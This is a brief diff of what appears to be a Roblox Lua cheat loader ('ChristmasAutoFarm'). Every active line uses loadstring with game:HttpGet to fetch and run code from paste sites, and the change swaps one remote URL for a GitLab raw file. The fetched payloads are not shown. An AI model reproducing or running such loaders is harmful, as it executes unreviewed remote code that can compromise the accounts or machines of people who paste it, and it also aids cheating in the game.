@@ -3,6 +3,6 @@ local fenv = getfenv()
 task.spawn(function()
     loadstring(game:HttpGet("https://cdn.sourceb.in/bins/frFvztQ8JR/0"))()
 end)
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/8217237"))()
+loadstring(game:HttpGet("https://gitlab.com/mm2main/ChristmasAutoFarm/-/raw/main/LocalPlayer"))()
 
 
